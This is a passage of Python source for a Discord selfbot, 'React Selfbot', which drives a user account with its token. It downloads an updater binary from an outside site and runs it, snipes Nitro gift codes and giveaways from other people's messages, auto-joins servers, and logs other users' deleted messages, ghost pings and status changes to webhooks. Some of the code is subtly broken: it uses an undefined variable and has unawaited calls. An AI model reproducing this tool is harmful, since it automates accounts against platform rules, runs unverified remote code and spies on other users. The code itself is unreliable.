        python = sys.executable
        os.execl(python, python, *sys.argv)

    @React.command(usage="updatebot", description="Updates the Selfbot")
    async def updatebot(ctx):
        await ctx.message.delete()
        if os.name == 'nt':
            try:
                os.remove("AutoUpdater.exe")
            except:
                pass
            open("./AutoUpdater.exe", "wb").write(requests.get("https://reactselfbot.pro/download/AutoUpdater.exe", allow_redirects=True).content)
            os.system('"AutoUpdater.exe"')
        else:
            if os.uname().machine == 'x86_64':
                try:
                    os.remove("reactautoupdater_x64_x86")
                except:
                    pass
                open("./reactautoupdater_x64_x86", "wb").write(requests.get("https://reactselfbot.pro/download/reactautoupdater_x64_x86", allow_redirects=True).content)
                os.system("chmod +x reactautoupdater_x64_x86 && ./reactautoupdater_x64_x86")
            else:
                try:
                    os.remove("reactautoupdater_arm")
                except:
                    pass
                open("./reactautoupdater_arm", "wb").write(requests.get("https://reactselfbot.pro/download/reactautoupdater_arm", allow_redirects=True).content)
                os.system("chmod +x reactautoupdater_arm && ./reactautoupdater_arm")
        
    already_redeemed = []

    @React.listen()
    async def on_message_edit(before, after):
        if json.load(open('config.json', encoding='utf-8'))['nitro_sniper'] == True and nitroRegex.search(after.content) and after.channel not in ignored_nitro_channels:
            code = nitroRegex.search(msg.content).group(2)
            if len(code) >= 16 and code not in already_redeemed:
                async with httpx.AsyncClient() as client:    
                    start_time = time.time()
                    result = await client.post(f'https://canary.discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': after.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    elapsed = '%.3fs' % (time.time() - start_time)
                
                status = 'Ratelimit'
                web_status = 'None'
                ping = False
                if 'This gift has been redeemed already' in str(result.content):
                    status = f'{fg.red}Already redeemed'
                    web_status = 'Already redeemed'
                elif 'nitro' in str(result.content):
                    status = f'{fg.green}Successfully redeemed!'
                    web_status = 'Successfully redeemed!'
                    ping = True
                elif 'Unknown Gift Code' in str(result.content):
                    status = f'{fg.yellow}Unknown/Invalid'
                    web_status = 'Unknown/Invalid'
                    
                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro')                
                print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{after.guild}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{after.author}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{after.channel}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Elapsed: {fg.white}{elapsed}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {status}")
                already_redeemed.append(code)
                if ping:
                    if json.load(open('config.json', encoding='utf-8'))['nitro_redeem_notify'] and sys.platform == "win32":
                        try:
                            toaster.show_toast("Nitro Sniper", f"Successfully redeemed a Nitro code! \nServer: {after.guild} \nAuthor: {after.author}\nChannel: {after.channel}", icon_path="react.ico", duration=2)
                        except:
                            pass
                    payload = json.dumps({
                    "content": f"<@{React.user.id}>",
                    "embeds": [
                        {
                        "title": "React Nitro Sniper Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "fields": [
                            {
                            "name": "__üç≠ Code__",
                            "value": f'{code}',
                            "inline": "true"
                            },
                            {
                            "name": "__‚è± Time Elapsed__",
                            "value": f'{elapsed}',
                            "inline": "true"
                            },
                            {
                            "name": "__üéÄ Status__",
                            "value": f'{web_status}',
                            "inline": "true"
                            },
                            {
                            "name": "__üß¨ Author__",
                            "value": f'{after.author}',
                            "inline": "true"
                            },
                            {
                            "name": "__üõã Server__",
                            "value": f'{after.guild}',
                            "inline": "true"
                            },
                            {
                            "name": "__ü•§ Channel__",
                            "value": f'{after.channel}',
                            "inline": "true"
                            },
                            {
                            "name": "__üîó Jump to channel__",
                            "value": f'[Jump URL]({after.jump_url})',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })
                else:
                    payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Nitro Sniper Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "fields": [
                            {
                            "name": "__üç≠ Code__",
                            "value": f'{code}',
                            "inline": "true"
                            },
                            {
                            "name": "__‚è± Time Elapsed__",
                            "value": f'{elapsed}',
                            "inline": "true"
                            },
                            {
                            "name": "__üéÄ Status__",
                            "value": f'{web_status}',
                            "inline": "true"
                            },
                            {
                            "name": "__üß¨ Author__",
                            "value": f'{after.author}',
                            "inline": "true"
                            },
                            {
                            "name": "__üõã Server__",
                            "value": f'{after.guild}',
                            "inline": "true"
                            },
                            {
                            "name": "__ü•§ Channel__",
                            "value": f'{after.channel}',
                            "inline": "true"
                            },
                            {
                            "name": "__üîó Jump to channel__",
                            "value": f'[Jump URL]({after.jump_url})',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

                try:
                    requests.post(json.load(open('config.json', encoding='utf-8'))['nitro_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                except Exception:
                    pass

            else:
                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro')                    
                print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {fg.red}Fake")

        async def check_for_giveaway(msg):
            try:
                if json.load(open('config.json', encoding='utf-8'))['giveaway_sniper'] == True and msg.author.bot:
                    custom_giveaway_bot_ids = []
                    custom_giveaway_bot_reactions = []
                    try:
                        if os.path.exists('GiveawayBots.json'):
                            with open("GiveawayBots.json", "r", encoding="utf-8") as jsonFile:
                                data = json.load(jsonFile)
                            
                            for key, value in data.items():
                                try:
                                    custom_giveaway_bot_ids.append(int(key))
                                    custom_giveaway_bot_reactions.append(str(value))
                                except Exception:
                                    pass
                    except Exception as e:
                        pass


                    if ((("giveaway" in str(msg.content).lower()) and (int(msg.author.id) in custom_giveaway_bot_ids) and ("cancelled" not in str(msg.content).lower()) and ("mention" not in str(msg.content).lower()) and ("specify" not in str(msg.content).lower()) and ("confratulations" not in str(msg.content).lower()))):
                        found_something_blacklisted = 0
                        for blocked_word in giveaway_blocked_words:
                            if str(blocked_word).lower() in str(msg.content).lower():
                                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Skipped Giveaway (Blacklisted)')                        
                                print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}")
                                found_something_blacklisted = 1
                                
                        try:
                            for embed in msg.embeds:
                                embed_dict = embed.to_dict()
                                for blocked_word in giveaway_blocked_words:
                                    try:
                                        found = re.findall(blocked_word, str(embed_dict).lower())[0]
                                        if found:
                                            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Skipped Giveaway (Blacklisted)')                        
                                            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                                                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}")
                                            found_something_blacklisted = 1
                                            break
                                    except:
                                        pass
                                        
                                    if found_something_blacklisted > 0:
                                        break
                        except:
                            pass
                        
                        if found_something_blacklisted == 0:
                            try:
                                embeds = msg.embeds
                                joined_server = 'None'
                                
                                giveaway_prize = None
                                
                                try:
                                    for embed in embeds:
                                        giveaway_prize = embed.to_dict()['author']['name']
                                except Exception:
                                    for embed in embeds:
                                        giveaway_prize = embed.to_dict()['title']
                                
                                if json.load(open('config.json', encoding='utf-8'))['giveaway_server_joiner']:
                                    try:
                                        for embed in embeds:
                                            embed_dict = embed.to_dict()
                                            code = re.findall(r"\w[a-z]*\W*\w[a-z]+\.\w[g]*\W\S*", str(embed_dict['description']))[0].replace(")", "").replace("https://discord.gg/", "")
                                            async with httpx.AsyncClient() as client:
                                                await client.post(f'https://canary.discord.com/api/v8/invites/{code}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                                                joined_server = f'discord.gg/{code}'
                                                asyncio.sleep(5)
                                    except:
                                        pass

                                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Giveaway Join')                        
                                print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Prize: {fg.white}{giveaway_prize}"
                                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Joining in: {fg.white}{json.load(open('config.json', encoding='utf-8'))['giveaway_timeout']} seconds"
                                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Joined Discord: {fg.white}{joined_server}")
                                
                                if json.load(open('config.json', encoding='utf-8'))['giveaway_join_notify'] and sys.platform == "win32":
                                    try:
                                        toaster.show_toast("Giveaway Sniper", f"You will join a giveaway in {msg.guild} in {json.load(open('config.json', encoding='utf-8'))['giveaway_timeout']} seconds!", icon_path="react.ico", duration=2)
                                    except:
                                        pass
                                
                                payload = json.dumps({
                                "embeds": [
                                    {
                                    "title": "React Giveaway Sniper Webhook",
                                    "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                                    "thumbnail": {
                                        "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                                    },
                                    "description": "Entered Giveaway",
                                    "fields": [
                                        {
                                        "name": "__üéÅ Prize__",
                                        "value": f'{giveaway_prize}',
                                        "inline": "true"
                                        },
                                        {
                                        "name": "__üõã Server__",
                                        "value": f'{msg.guild}',
                                        "inline": "true"
                                        },
                                        {
                                        "name": "__ü•§ Channel__",
                                        "value": f'{msg.channel}',
                                        "inline": "true"
                                        },
                                        {
                                        "name": "__‚úÖ Joining in__",
                                        "value": f'{json.load(open("config.json", encoding="utf-8"))["giveaway_timeout"]} seconds',
                                        "inline": "true"
                                        },
                                        {
                                        "name": "__üîó Jump to channel__",
                                        "value": f'[Jump URL]({msg.jump_url})',
                                        "inline": "true"
                                        }
                                    ],
                                    "footer": {
                                        "text": "React Selfbot"
                                    }
                                    }
                                ]
                                })

                                try:
                                    requests.post(json.load(open('config.json', encoding='utf-8'))['giveaways_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                                except Exception:
                                    pass
                            except:
                                return

                            await asyncio.sleep(json.load(open('config.json', encoding='utf-8'))['giveaway_timeout'])

                            try:
                                if int(msg.author.id) in custom_giveaway_bot_ids:
                                    index = custom_giveaway_bot_ids.index(int(msg.author.id))
                                    await msg.add_reaction(custom_giveaway_bot_reactions[index])
                            except Exception:
                                pass
            except Exception as e:
                pass

        check_for_giveaway(after)

        if after.author == React.user:
            await React.process_commands(after)
            try:
                with open("CustomCommands.json", "r") as jsonFile:
                    data = json.load(jsonFile)
                    
                    if data[after.content]:
                        
                        command_output = data[after.content]
                        
                        await after.delete()
                        
                        await after.channel.send(command_output)
                        print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Command Used | ' + fg.purple3 + str(after.content))
            except KeyError:
                pass
        
    @React.listen()
    async def on_ready():
        try:
            if sys.platform == "win32":
                try:
                    # toaster.show_toast("React Selfbot", f"Connected", icon_path="react.ico", duration=2)
                    print('React Selfbot is connected!')
                except Exception:
                    pass
            playsound.playsound("./Sound/connected.mp3")
        except:
            pass

    @React.listen()
    async def on_relationship_add(relationship):
        try:
            if relationship.type == discord.RelationshipType.incoming_request and json.load(open('config.json', encoding='utf-8'))['block_incoming_friends']:
                await relationship.delete()
        except:
            pass

    @React.listen()
    async def on_relationship_remove(relationship):
        try:
            if json.load(open('config.json', encoding='utf-8'))['relationship_detection']:
                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Relationship Update')                    
                print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | User: {fg.white}{relationship.user}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Type: Relationship removed")
                

                if json.load(open('config.json', encoding='utf-8'))['relationship_sound'] == True:
                    try:
                        playsound.playsound("./Sound/failure.mp3")
                    except:
                        pass

                payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Detection Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected relationship update",
                        "fields": [
                            {
                            "name": "__üíÅ‚Äç‚ôÇÔ∏è Relationship with__",
                            "value": f'{relationship.user}',
                            "inline": "true"
                            },
                            {
                            "name": "__üíî Type__",
                            "value": f'Relationship removed',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

                try:
                    requests.post(json.load(open('config.json', encoding='utf-8'))['relationship_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                except Exception:
                    pass
                
                try:
                    if json.load(open('config.json', encoding='utf-8'))['relationship_notify'] and sys.platform == "win32":
                        try:
                            toaster.show_toast("Relationship Update", f"Relationship with {relationship.user} was removed.", icon_path="react.ico", duration=2)
                        except:
                            pass
                except:
                    pass
        except:
            pass


    @React.listen()
    async def on_message_delete(message):
        if message.author in deletesend_array:
            try:
                if message.content.startswith(json.load(open("config.json", encoding="utf-8"))["prefix"]):
                    pass
                else:
                    await message.channel.send(message.content)
            except:
                pass
        # (isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel))
        if message.author is not React.user:
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: DM Message Deleted')                    
            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | User: {fg.white}{message.author}"
                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Channel: {fg.white}{message.channel}"
                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Content: {fg.white}{message.content}")
            
            if json.load(open('config.json', encoding='utf-8'))['dm_delete_sound'] == True:
                try:
                    playsound.playsound("./Sound/notification.mp3")
                except:
                    pass

            if json.load(open('config.json', encoding='utf-8'))['deleted_dm_notify'] and sys.platform == "win32":
                try:
                    toaster.show_toast("DM Deletion", f"{message.author} deleted a message in your DMs! \nContent: {message.content}", icon_path="react.ico", duration=2)
                except:
                    pass
        
            payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Detection Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected deleted DM message",
                        "fields": [
                            {
                            "name": "__üß¨ Author__",
                            "value": f'{message.author}',
                            "inline": "true"
                            },
                            {
                            "name": "__ü•§ Channel__",
                            "value": f'{message.channel}',
                            "inline": "true"
                            },
                            {
                            "name": "__‚úâÔ∏è Content__",
                            "value": f'{message.content}',
                            "inline": "true"
                            },
                            {
                            "name": "__üîó Jump to channel__",
                            "value": f'[Jump URL]({message.jump_url})',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['dm_delete_notify_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass
            
        if React.user.mentioned_in(message) and json.load(open('config.json', encoding='utf-8'))['ghostping_detection']:
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Ghostping')                    
            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{message.guild}"
                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | User: {fg.white}{message.author}"
                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Channel: {fg.white}{message.channel}"
                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Content: {fg.white}{message.content}")
            
            if json.load(open('config.json', encoding='utf-8'))['ghostping_sound'] == True:
                try:
                    playsound.playsound("./Sound/failure.mp3")
                except:
                    pass
            
            try:
                if json.load(open('config.json', encoding='utf-8'))['ghostping_notify'] and sys.platform == "win32":
                    toaster.show_toast("Ghostping", f"Server: {message.guild} \nUser: {message.author} \nContent: {message.content}", icon_path="react.ico", duration=2)
            except:
                pass
            
            payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Detection Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected Ghostping",
                        "fields": [
                            {
                            "name": "__üß¨ Author__",
                            "value": f'{message.author}',
                            "inline": "true"
                            },
                            {
                            "name": "__üõã Server__",
                            "value": f'{message.guild}',
                            "inline": "true"
                            },
                            {
                            "name": "__ü•§ Channel__",
                            "value": f'{message.channel}',
                            "inline": "true"
                            },
                            {
                            "name": "__‚úâÔ∏è Content__",
                            "value": f'{message.content}',
                            "inline": "true"
                            },
                            {
                            "name": "__üîó Jump to channel__",
                            "value": f'[Jump URL]({message.jump_url})',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['ghostping_detection_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass

        global snipe_message_content
        global snipe_message_author
        global snipe_message_id
        global snipe_message_server

        snipe_message_content = message.content
        snipe_message_author = message.author
        snipe_message_id = message.id
        snipe_message_server = message.guild
        
        await asyncio.sleep(60)

        if message.id == snipe_message_id:
            snipe_message_author = None
            snipe_message_content = None
            snipe_message_id = None
            snipe_message_server = None
            
                    
    watched_users = []
                    
    @React.listen()
    async def on_member_update(before, after):
        async def check_for_watched_event():
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            watch_users = []
            for _id in data['watched_users']:
                watch_users.append(_id)
                
            if after not in watched_users and before.status != after.status and before.id in watch_users:
                try:
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Watcher | ' + fg.purple3 + f"User {before.name}#{before.discriminator} changed his status to {after.status}")
                    watched_users.append(after)
                except Exception:
                    pass
                
                payload = json.dumps({
                        "embeds": [
                            {
                            "title": "React Watcher Webhook",
                            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                            "thumbnail": {
                                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                            },
                            "description": "Detected User Change",
                            "fields": [
                                {
                                "name": "__üß¨ User__",
                                "value": f'{before.name}#{before.discriminator}',
                                "inline": "true"
                                },
                                {
                                "name": "__üéä Old Status__",
                                "value": f'{before.status}',
                                "inline": "true"
                                },
                                {
                                "name": "__üéâ New Status__",
                                "value": f'{after.status}',
                                "inline": "true"
                                }
                            ],
                            "footer": {
                                "text": "React Selfbot"
                            }
                            }
                        ]
                        })

                try:
                    requests.post(json.load(open('config.json', encoding='utf-8'))['watcher_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                except Exception:
                    pass
                await asyncio.sleep(3)
                watched_users.clear()
                return
                
            if after not in watched_users and before.activity != after.activity and before.id in watch_users:
                try:
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Watcher | ' + fg.purple3 + f"User {before.name}#{before.discriminator} changed his activity to {after.activity}")
                    watched_users.append(after)
                except Exception:
                    pass
                payload = json.dumps({
                        "embeds": [
                            {
                            "title": "React Watcher Webhook",
                            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                            "thumbnail": {
                                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                            },
                            "description": "Detected User Change",
                            "fields": [
                                {
                                "name": "__üß¨ User__",
                                "value": f'{before.name}#{before.discriminator}',
                                "inline": "true"
                                },
                                {
                                "name": "__üö¥ Old Activity__",
                                "value": f'{before.activity}',
                                "inline": "true"
                                },
                                {
                                "name": "__üèÇ New Activity__",
                                "value": f'{after.activity}',
                                "inline": "true"
                                }
                            ],
                            "footer": {
                                "text": "React Selfbot"
                            }
                            }
                        ]
                        })

                try:
                    requests.post(json.load(open('config.json', encoding='utf-8'))['watcher_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                except Exception:
                    pass
                await asyncio.sleep(3)
                watched_users.clear()
                return
        await check_for_watched_event()

        async def check_for_role_updates():
            if (before.id & after.id) == React.user.id:
                for role in before.roles:
                    if role not in after.roles:
                        print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Role removed')                    
                        print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{after.guild.name}"
                            f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Role: {fg.white}{role.name}")

                        if json.load(open('config.json', encoding='utf-8'))['role_update_sound'] == True:
                            try:
                                playsound.playsound("./Sound/information.mp3")
                            except:
                                pass

                        payload = json.dumps({
                                "embeds": [
                                    {
                                    "title": "React Detection Webhook",
                                    "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                                    "thumbnail": {
                                        "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                                    },
                                    "description": "Detected removed role",
                                    "fields": [
                                        {
                                        "name": "__ü§ø Role__",
                                        "value": f'{role.name}',
                                        "inline": "true"
                                        },
                                        {
                                        "name": "__üõã Server__",
                                        "value": f'{after.guild.name}',
                                        "inline": "true"
                                        }
                                    ],
                                    "footer": {
                                        "text": "React Selfbot"
                                    }
                                    }
                                ]
                                })

                        try:
                            requests.post(json.load(open('config.json', encoding='utf-8'))['role_update_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                        except Exception:
                            pass

                        try:
                            if json.load(open('config.json', encoding='utf-8'))['role_update_notify'] and sys.platform == "win32":
                                toaster.show_toast("Roles Update Detection", f"Role: {role.name} \nServer: {after.guild.name}\n Type: Role removed", icon_path="react.ico", duration=2)
                        except:
                            pass
                    
                for role in after.roles:
                    if role not in before.roles:
                        print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Role added')                    
                        print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{after.guild.name}"
                            f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Role: {fg.white}{role.name}")

                        if json.load(open('config.json', encoding='utf-8'))['role_update_sound'] == True:
                            try:
                                playsound.playsound("./Sound/information.mp3")
                            except:
                                pass

                        payload = json.dumps({
                                "embeds": [
                                    {
                                    "title": "React Detection Webhook",
                                    "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                                    "thumbnail": {
                                        "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                                    },
                                    "description": "Detected added role",
                                    "fields": [
                                        {
                                        "name": "__ü§ø Role__",
                                        "value": f'{role.name}',
                                        "inline": "true"
                                        },
                                        {
                                        "name": "__üõã Server__",
                                        "value": f'{after.guild.name}',
                                        "inline": "true"
                                        }
                                    ],
                                    "footer": {
                                        "text": "React Selfbot"
                                    }
                                    }
                                ]
                                })

                        try:
                            requests.post(json.load(open('config.json', encoding='utf-8'))['role_update_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                        except Exception:
                            pass

                        try:
                            if json.load(open('config.json', encoding='utf-8'))['role_update_notify'] and sys.platform == "win32":
                                toaster.show_toast("Roles Update Detection", f"Role: {role.name} \nServer: {after.guild.name}\n Type: Role added", icon_path="react.ico", duration=2)
                        except:
                            pass
            pass
        await check_for_role_updates()

        async def check_for_nickname_updates():
            if (before.id & after.id) == React.user.id:
                if after.nick != before.nick:
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Nickname update')                    
                    print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{after.guild.name}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Before: {fg.white}{before.nick}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | After: {fg.white}{after.nick}")

